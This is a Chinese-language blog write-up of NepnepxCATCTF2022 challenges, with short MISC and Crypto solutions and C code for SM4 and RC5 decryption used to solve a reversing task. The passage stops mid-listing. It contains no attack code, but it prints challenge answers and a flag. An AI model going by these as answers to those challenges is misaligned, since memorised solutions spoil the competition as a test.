<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NepnepxCATCTF2022 writeup by TokameinE | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>NepnepxCATCTF2022 writeup by TokameinE</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-01-02T09:00:00.000Z" id="date"> 2023-01-02</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-12-29T04:50:34.988Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><h1 id="闲言"><a href="#闲言" class="headerlink" title="闲言"></a>闲言</h1><p class='item-img' data-src='https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301011954337.png'><img src="https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301011954337.png"></p>
<p>感觉大佬们都没来，让我混到第三名了。估计二进制大佬们全都是打 ASIS final 了，就我这个废物不配打QAQ</p>
<p>题目感觉都不是很难，主要还是我比较菜，做题速度太慢了，以及第一天睡大觉晚了好久上线，不然可能可以多刷几个前三血，不过没奖励，前十血就能捐猫粮了，也就无所谓了。</p>
<p>PWN这边内核直接不会，开始摆烂，其他几题看到后面已经完全摆烂了，就没继续看了。injection2.0 那道题本地的环境一直打不开，最后开了远程环境随便看了看感觉还行就搞了一下。</p>
<p>RE的话 CatFly 没搞出来可惜了，算法没抄明白，有时间的话再试试看吧。</p>
<p>MISC 纯摆烂了，做不明白，就拿 010 看了几个，能看出来的就做了，看不出来的就摆了。几个题目猜到可能是工具，但是懒得下了就不做了。还有几个从头到尾就没看懂要干什么，放弃。</p>
<p>整个比赛打下来感觉没啥收获，感觉跟复健似的，等一波其他大佬的 WP 吧。密码一题也没做出来，有几个签到题还是想看看的，以及 CatFly 那题也想看看该怎么抄代码，其他的就随便看看吧。PWN 那边没啥体力继续看了，有心情了再看看吧。</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Cat-Jump"><a href="#Cat-Jump" class="headerlink" title="Cat_Jump"></a>Cat_Jump</h2><p>010 直接查就完事了，属于是意料之外：</p>
<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301011954185.png'><img src="https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301011954185.png"></p>
<h2 id="MeowMeow"><a href="#MeowMeow" class="headerlink" title="MeowMeow"></a>MeowMeow</h2><p>图片尾巴有 base64 和一大堆数据，解出来 base64 说是 ASCII art，猜是二进制看的。本来要写脚本，但是 010 确实好用，直接看就完事了：</p>
<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301011957486.png'><img src="https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301011957486.png"></p>
<h2 id="CatchCat"><a href="#CatchCat" class="headerlink" title="CatchCat"></a>CatchCat</h2><p>最开始没做出来，找了半天工具没找到，第二天随便搜了一下搜到在线工具了，放大了直接看就行了：</p>
<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301011958651.png'><img src="https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301011958651.png"></p>
<h2 id="Nepnep-祝你新年快乐啦！"><a href="#Nepnep-祝你新年快乐啦！" class="headerlink" title="Nepnep 祝你新年快乐啦！"></a>Nepnep 祝你新年快乐啦！</h2><p class='item-img' data-src='https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012000524.jpg'><img src="https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012000524.jpg"></p>
<h2 id="CatFlag"><a href="#CatFlag" class="headerlink" title="CatFlag"></a>CatFlag</h2><p>确实是 CatFlag：</p>
<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012001182.png'><img src="https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012001182.png"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="cat’s-gift"><a href="#cat’s-gift" class="headerlink" title="cat’s gift"></a>cat’s gift</h2><p> <strong>1 - 1&#x2F;3 + 1&#x2F;5 - 1&#x2F;7 + …</strong> 的积分是 pi&#x2F;4，所以礼物应该是 pi，但是试了半天没对，改成 pie 就对了，难崩……</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="StupidOrangeCat2"><a href="#StupidOrangeCat2" class="headerlink" title="StupidOrangeCat2"></a>StupidOrangeCat2</h2><p>一个 SM4，一个 RC5，找到密文直接解就行了。不过 RC5 没用到密钥，或者说用了默认密钥：</p>
<h3 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &quot;chacha20.h&quot;<br><br>void four_uCh2uLong(u8* in, u32* out)<br>&#123;<br>    int i = 0;<br>    *out = 0;<br>    for (i = 0; i &lt; 4; i++)<br>        *out = ((u32)in[i] &lt;&lt; (24 - i * 8)) ^ *out;<br>&#125;<br><br>void uLong2four_uCh(u32 in, u8* out)<br>&#123;<br>    int i = 0;<br>    //从32位unsigned long的高位开始取<br>    for (i = 0; i &lt; 4; i++)<br>        *(out + i) = (u32)(in &gt;&gt; (24 - i * 8));<br>&#125;<br><br>u32 move(u32 data, int length)<br>&#123;<br>    u32 result = 0;<br>    result = (data &lt;&lt; length) ^ (data &gt;&gt; (32 - length));<br><br>    return result;<br>&#125;<br><br>u32 func_key(u32 input)<br>&#123;<br>    int i = 0;<br>    u32 ulTmp = 0;<br>    u8 ucIndexList[4] = &#123; 0 &#125;;<br>    u8 ucSboxValueList[4] = &#123; 0 &#125;;<br>    uLong2four_uCh(input, ucIndexList);<br>    for (i = 0; i &lt; 4; i++)<br>    &#123;<br>        ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];<br>    &#125;<br>    four_uCh2uLong(ucSboxValueList, &amp;ulTmp);<br>    ulTmp = ulTmp ^ move(ulTmp, 13) ^ move(ulTmp, 23);<br><br>    return ulTmp;<br>&#125;<br><br>u32 func_data(u32 input)<br>&#123;<br>    int i = 0;<br>    u32 ulTmp = 0;<br>    u8 ucIndexList[4] = &#123; 0 &#125;;<br>    u8 ucSboxValueList[4] = &#123; 0 &#125;;<br>    uLong2four_uCh(input, ucIndexList);<br>    for (i = 0; i &lt; 4; i++)<br>    &#123;<br>        ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];<br>    &#125;<br>    four_uCh2uLong(ucSboxValueList, &amp;ulTmp);<br>    ulTmp = ulTmp ^ move(ulTmp, 2) ^ move(ulTmp, 10) ^ move(ulTmp, 18) ^ move(ulTmp, 24);<br><br>    return ulTmp;<br>&#125;<br>void encode_fun(u8 len, u8* key, u8* input, u8* output)<br>&#123;<br>    int i = 0, j = 0;<br>    u8* p = (u8*)malloc(50);      //定义一个50字节缓存区<br>    u32 ulKeyTmpList[4] = &#123; 0 &#125;;   //存储密钥的u32数据<br>    u32 ulKeyList[36] = &#123; 0 &#125;;     //用于密钥扩展算法与系统参数FK运算后的结果存储<br>    u32 ulDataList[36] = &#123; 0 &#125;;    //用于存放加密数据<br>    four_uCh2uLong(key, &amp;(ulKeyTmpList[0]));<br>    four_uCh2uLong(key + 4, &amp;(ulKeyTmpList[1]));<br>    four_uCh2uLong(key + 8, &amp;(ulKeyTmpList[2]));<br>    four_uCh2uLong(key + 12, &amp;(ulKeyTmpList[3]));<br><br>    ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0];<br>    ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1];<br>    ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2];<br>    ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3];<br><br>    for (i = 0; i &lt; 32; i++)             //32次循环迭代运算<br>    &#123;<br>        ulKeyList[i + 4] = ulKeyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]);<br>    &#125;<br>    for (i = 0; i &lt; len; i++)        //将输入数据存放在p缓存区<br>        *(p + i) = *(input + i);<br>    for (i = 0; i &lt; 16 - len % 16; i++)//将不足16位补0凑齐16的整数倍<br>        *(p + len + i) = 0;<br><br>    for (j = 0; j &lt; len / 16 + ((len % 16) ? 1 : 0); j++) <br>    &#123;<br>        four_uCh2uLong(p + 16 * j, &amp;(ulDataList[0]));<br>        four_uCh2uLong(p + 16 * j + 4, &amp;(ulDataList[1]));<br>        four_uCh2uLong(p + 16 * j + 8, &amp;(ulDataList[2]));<br>        four_uCh2uLong(p + 16 * j + 12, &amp;(ulDataList[3]));<br>        for (i = 0; i &lt; 32; i++)<br>        &#123;<br>            ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[i + 4]);<br>        &#125;<br>        uLong2four_uCh(ulDataList[35], output + 16 * j);<br>        uLong2four_uCh(ulDataList[34], output + 16 * j + 4);<br>        uLong2four_uCh(ulDataList[33], output + 16 * j + 8);<br>        uLong2four_uCh(ulDataList[32], output + 16 * j + 12);<br>    &#125;<br>    free(p);<br>&#125;<br><br>void decode_fun(u8 len, u8* key, u8* input, u8* output)<br>&#123;<br>    int i = 0, j = 0;<br>    u32 ulKeyTmpList[4] = &#123; 0 &#125;;//存储密钥的u32数据<br>    u32 ulKeyList[36] = &#123; 0 &#125;;  //用于密钥扩展算法与系统参数FK运算后的结果存储<br>    u32 ulDataList[36] = &#123; 0 &#125;; //用于存放加密数据<br>    four_uCh2uLong(key, &amp;(ulKeyTmpList[0]));<br>    four_uCh2uLong(key + 4, &amp;(ulKeyTmpList[1]));<br>    four_uCh2uLong(key + 8, &amp;(ulKeyTmpList[2]));<br>    four_uCh2uLong(key + 12, &amp;(ulKeyTmpList[3]));<br><br>    ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0];<br>    ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1];<br>    ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2];<br>    ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3];<br><br>    for (i = 0; i &lt; 32; i++)            <br>    &#123;<br>        ulKeyList[i + 4] = ulKeyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]);<br>    &#125;<br>    for (j = 0; j &lt; len / 16; j++)<br>    &#123;<br>        four_uCh2uLong(input + 16 * j, &amp;(ulDataList[0]));<br>        four_uCh2uLong(input + 16 * j + 4, &amp;(ulDataList[1]));<br>        four_uCh2uLong(input + 16 * j + 8, &amp;(ulDataList[2]));<br>        four_uCh2uLong(input + 16 * j + 12, &amp;(ulDataList[3]));<br>        for (i = 0; i &lt; 32; i++)<br>        &#123;<br>            ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[35 - i]);<br>        &#125;<br>        uLong2four_uCh(ulDataList[35], output + 16 * j);<br>        uLong2four_uCh(ulDataList[34], output + 16 * j + 4);<br>        uLong2four_uCh(ulDataList[33], output + 16 * j + 8);<br>        uLong2four_uCh(ulDataList[32], output + 16 * j + 12);<br>    &#125;<br>&#125;<br><br>void print_hex(u8* data, int len)<br>&#123;<br>    int i = 0;<br>    char alTmp[16] = &#123; &#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27; &#125;;<br>    for (i = 0; i &lt; len; i++)<br>    &#123;<br>        printf(&quot;%c&quot;, alTmp[data[i] / 16]);<br>        printf(&quot;%c&quot;, alTmp[data[i] % 16]);<br>        putchar(&#x27; &#x27;);<br>    &#125;<br>    putchar(&#x27;\n&#x27;);<br>&#125;<br>int main(void)<br>&#123;<br><br>    unsigned char a91tNhn90uTlt1l[] =<br>    &#123;<br>      0x5B, 0x40, 0x39, 0x31, 0x54, 0x25, 0x4E, 0x68, 0x6E, 0x7B,<br>      0x39, 0x30, 0x55, 0x40, 0x74, 0x6C, 0x54, 0x25, 0x31, 0x6C,<br>      0x54, 0x24, 0x64, 0x70, 0x68, 0x50, 0x68, 0x66, 0x69, 0x40,<br>      0x39, 0x31, 0x4F, 0x00<br>    &#125;;<br>    for (int i = 0; i &lt; 33; i += 4)<br>    &#123;<br>        a91tNhn90uTlt1l[i] ^= 0xC;<br>        a91tNhn90uTlt1l[i + 1] ^= 0x17;<br>    &#125;//You_can_take_me_with_you<br>    //CAT_IN_X_19_Y_39<br>    //_CATLOVE_OR_LIKE<br>    // LIKE_OR_LOVE_CAT<br>    //EKIL_RO_EVOLTAC_<br>    //CatCTF&#123;You_can_take_me_with_you_CAT_IN_X_19_Y_39_&#125;<br>    //CAT_IN_X_19_Y_39_LIKE_OR_LOVE_CAT<br>    u8 i, len;<br>    u8 encode_Result[50] = &#123; 0 &#125;;    //定义加密输出缓存区<br>    u8 decode_Result[50] = &#123; 0 &#125;;    //定义解密输出缓存区<br>    unsigned char key[] = &quot;wuwuwuyoucatchme&quot;;<br>    u8 Data_plain[16] = &#123; 0xB6,0x75,0xE1,0x79,0x70,0xC1,0x27,0x48,9,0xB,0xB6,0x4D,2,0xBC,6,0x19 &#125;;<br>    len = 16 * (sizeof(Data_plain) / 16) + 16 * ((sizeof(Data_plain) % 16) ? 1 : 0);<br><br>    decode_fun(len, key, Data_plain, decode_Result); <br>    printf(&quot;解密后数据是：\n&quot;);<br>    for (i = 0; i &lt; len; i++)<br>        printf(&quot;%x &quot;, *(decode_Result + i));<br><br>    system(&quot;pause&quot;);<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a>RC5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdlib.h&gt; <br>#include &lt;stdio.h&gt; <br>#include &lt;string.h&gt; <br>#include &lt;math.h&gt;     <br>int w = 32;//字长 32bit 4字节 <br>int r = 12;//12;//加密轮数12 <br>int b = 16;//主密钥(字节为单位8bit)个数  这里有16个<br>int t = 26;//2*r+2=12*2+2=26 <br>int c = 4; //主密钥个数*8/w = 16*8/32  <br>typedef unsigned long int FOURBYTEINT;//四字节 <br>typedef unsigned short int TWOBYTEINT;//2字节 <br>typedef unsigned char BYTE;<br>void InitialKey(unsigned char* KeyK, int b);<br>void generateChildKey(unsigned char* KeyK, FOURBYTEINT* ChildKeyS);<br>void Encipher(FOURBYTEINT* In, FOURBYTEINT* Out, FOURBYTEINT* S);<br>void Decipher(FOURBYTEINT* In, FOURBYTEINT* Out, FOURBYTEINT* S);<br>void InitialKey(unsigned char* KeyK, int b)<br>&#123;<br>    int i, j;<br>    int intiSeed = 3;<br>    for (i = 0; i &lt; b; i++)<br>    &#123;<br>        KeyK[i] = 0;<br>    &#125;<br>    KeyK[0] = intiSeed;<br>    printf(&quot;初始主密钥(16字节共128位)：%.2lx &quot;, KeyK[0]);<br>    for (j = 1; j &lt; b; j++)<br>    &#123;<br>        KeyK[j] = (BYTE)((int)pow(3, j) % (255 - j));<br>        printf(&quot;%.2X &quot;, KeyK[j]);<br>    &#125;<br>    printf(&quot;\n&quot;);<br>&#125;<br>void generateChildKey(unsigned char* KeyK, FOURBYTEINT* ChildKeyS)<br>&#123;<br>    int PW = 0xB7E15163;//0xb7e1; <br>    int QW = 0x9E3779B9;//0x9e37;//genggai <br>    int i;<br>    int u = w / 8;// b/8; <br>    FOURBYTEINT A, B, X, Y;<br>    FOURBYTEINT L[4]; //c=16*8/32<br>    A = B = X = Y = 0;<br>    ChildKeyS[0] = PW;<br>    printf(&quot;\n初始子密钥（没有主密钥的参与）：\n%.8X &quot;, ChildKeyS[0]);<br>    for (i = 1; i &lt; t; i++)   //t=26<br>    &#123;<br>        if (i % 13 == 0)printf(&quot;\n&quot;);<br>        ChildKeyS[i] = (ChildKeyS[i - 1] + QW);<br>        printf(&quot;%.8X &quot;, ChildKeyS[i]);<br>    &#125;<br>    printf(&quot;\n&quot;);<br>    for (i = 0; i &lt; c; i++)<br>    &#123;<br>        L[i] = 0;<br>    &#125;<br><br>    for (i = b - 1; i != -1; i--)<br>    &#123;<br>        L[i / u] = (L[i / u] &lt;&lt; 8) + KeyK[i];<br>    &#125;<br>    printf(&quot;\n把主密钥变换为4字节单位：\n&quot;);<br>    for (i = 0; i &lt; c; i++)<br>    &#123;<br>        printf(&quot;%.8X &quot;, L[i]);<br>    &#125;<br>    printf(&quot;\n\n&quot;);<br>    for (i = 0; i &lt; 3 * t; i++)<br>    &#123;<br>        X = ChildKeyS[A] = ROTL(ChildKeyS[A] + X + Y, 3);<br>        A = (A + 1) % t;<br>        Y = L[B] = ROTL(L[B] + X + Y, (X + Y));<br>        B = (B + 1) % c;<br>    &#125;<br>    printf(&quot;生成的子密钥（初始主密钥参与和初始子密钥也参与）：&quot;);<br>    for (i = 0; i &lt; t; i++)<br>    &#123;<br>        if (i % 13 == 0)printf(&quot;\n&quot;);<br>        printf(&quot;%.8X &quot;, ChildKeyS[i]);<br>    &#125;<br>    printf(&quot;\n\n&quot;);<br>&#125;<br>void Encipher(FOURBYTEINT* In, FOURBYTEINT* Out, FOURBYTEINT* S)<br>&#123;<br>    FOURBYTEINT X, Y;<br>    int i, j;<br>    for (j = 0; j &lt; NoOfData; j += 2)<br>    &#123;<br>        X = In[j] + S[0];<br>        Y = In[j + 1] + S[1];<br>        for (i = 1; i &lt;= r; i++)<br>        &#123;<br>            X = ROTL((X ^ Y), Y) + S[2 * i];<br>            Y = ROTL((Y ^ X), X) + S[2 * i + 1];<br>        &#125;<br>        Out[j] = X;<br>        Out[j + 1] = Y; //密文 <br>    &#125;<br>&#125;<br><br>void Decipher(FOURBYTEINT* In, FOURBYTEINT* Out, FOURBYTEINT* S)<br>&#123;<br>    int i = 0, j;<br>    FOURBYTEINT X, Y;<br>    for (j = 0; j &lt; NoOfData; j += 2)<br>    &#123;<br>        X = In[j];<br>        Y = In[j + 1];<br>        for (i = r; i &gt; 0; i--)<br>        &#123;<br>            Y = ROTR(Y - S[2 * i + 1], X) ^ X;<br>            X = ROTR(X - S[2 * i], Y) ^ Y;<br>        &#125;<br>        Out[j] = X - S[0];<br>        Out[j + 1] = Y - S[1];<br>    &#125;<br>&#125;<br><br>int main(void)<br>&#123;<br>    int k;<br>    FOURBYTEINT ChildKeyS[2 * 12 + 2];<br>    FOURBYTEINT ChildKey1[26];<br>    BYTE KeyK[16];<br>    FOURBYTEINT Source[] = &#123; 0x936AB12C,0xED8330B5,0xEE5C5E88,0xE10B508C &#125;;<br>    FOURBYTEINT Dest[NoOfData];             <br>    FOURBYTEINT Data[NoOfData] = &#123; 0 &#125;;    <br><br>    InitialKey(KeyK, b);<br>    generateChildKey(KeyK, ChildKeyS); <br><br>    printf(&quot;加密以前的明文:&quot;);<br>    for (k = 0; k &lt; NoOfData; k++)<br>    &#123;<br>        if (k % 2 == 0)<br>        &#123;<br>            printf(&quot;  &quot;);<br>        &#125;<br>        printf(&quot;%.8X &quot;, Source[k]); <br>    &#125;<br>    printf(&quot;\n&quot;);<br>    for (k = 0; k &lt; 26; k++)<br>    &#123;<br>        ChildKey1[k] = ChildKeyS[k];                    <br>    &#125;<br>    Decipher(Source, Data, 